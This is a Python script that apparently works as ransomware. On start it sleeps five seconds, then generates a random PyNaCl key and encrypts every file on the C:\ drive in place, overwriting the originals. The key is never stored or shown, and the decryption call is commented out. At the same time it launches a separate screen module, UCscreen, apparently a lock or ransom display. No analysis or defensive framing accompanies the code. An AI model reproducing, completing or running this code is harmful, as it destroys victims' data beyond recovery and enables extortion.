import os
import time
import base64
import threading
import webbrowser
import subprocess
from ttkthemes import *
from tkinter import *
from pathlib import *
import nacl.secret
from nacl.exceptions import CryptoError


def generate_key():
    return nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)


def encrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as file:
        plaintext = file.read()

    box = nacl.secret.SecretBox(key)
    nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
    encrypted = box.encrypt(plaintext, nonce)

    with open(output_file, 'wb') as file:
        file.write(encrypted)


def decrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as file:
        encrypted = file.read()

    box = nacl.secret.SecretBox(key)
    try:
        decrypted = box.decrypt(encrypted)
        with open(output_file, 'wb') as file:
            file.write(decrypted)
    except CryptoError:
        print("ERROR. Verify the KEY!.")


def encrypt_directory(key, input_dir, output_dir):
    for root, dirs, files in os.walk(input_dir):
        for filename in files:
            input_file = os.path.join(root, filename)
            relative_path = os.path.relpath(input_file, input_dir)
            output_file = os.path.join(output_dir, relative_path)
            os.makedirs(os.path.dirname(output_file), exist_ok=True)
            encrypt_file(key, input_file, output_file)


def decrypt_directory(key, input_dir, output_dir):
    for root, dirs, files in os.walk(input_dir):
        for filename in files:
            input_file = os.path.join(root, filename)
            relative_path = os.path.relpath(input_file, input_dir)
            output_file = os.path.join(output_dir, relative_path)
            os.makedirs(os.path.dirname(output_file), exist_ok=True)
            decrypt_file(key, input_file, output_file)


time.sleep(5)

def run_encryption():
    key = generate_key()
    input_dir = "C:\\"
    encrypted_dir = "C:\\"
    decrypted_dir = "C:\\_decrypted"
    encrypt_directory(key, input_dir, encrypted_dir)
    #decrypt_directory(key, encrypted_dir, decrypted_dir)

def run_gui():
    import UCscreen
    UCscreen.run_UCscreen()

if __name__ == "__main__":
    encryption_thread = threading.Thread(target=run_encryption)
    encryption_thread.start()

    gui_thread = threading.Thread(target=run_gui)
    gui_thread.start()

    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break
